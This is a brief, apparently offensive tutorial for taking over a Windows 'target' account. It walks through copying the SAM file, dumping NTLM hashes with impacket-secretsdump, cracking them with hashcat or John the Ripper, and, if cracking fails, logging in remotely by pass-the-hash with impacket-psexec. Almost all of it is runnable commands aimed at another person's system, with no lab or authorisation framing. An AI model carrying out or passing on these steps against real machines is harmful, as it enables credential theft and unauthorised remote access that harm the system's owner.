If the target is using Windows:
First, copy the path C:\Windows\System32\config\SAM somehow. This file contains the hash of the login password in Windows NTLM format.
In the terminal, type `impacket-secretsdump -sam SAM -system SYSTEM local`:
SAM: The SAM file you obtained from the registry.
SYSTEM: The file containing the key (boot key) needed to decrypt the hashes.
This code will give something like Username:1001:aad3b435b51404eeaad3b435b51404ee:31D6CFE0D16AE931B73C59D7E0C089C0::: Our hash is:
:31D6CFE0D16AE931B73C59D7E0C089C0
Save this hash as hash.txt. Hashcat uses GPU for speed. If you think it's not a very complex password:
Type `hashcat -m 1000 -a 0 hash.txt rockyou.txt` in the terminal.
If you think it's not easy but has a rule:
Type `hashcat -m 1000 -a 3 hash.txt ?l?l?l?d?d` in the terminal.
If you're going to use CPU and the password is easy:
Type `john --format=NT hash.txt --wordlist=rockyou.txt` and `john --show hash.txt` in the terminal.
If the password is very complex and you wait for hours but it doesn't work, log in to the system with a hash:
Enter `impacket-psexec [target's username]@[target's IP] -hashes :31D6CFE0D16AE931B73C59D7E0C089C0` into the terminal. This will log you into the system with that hash.
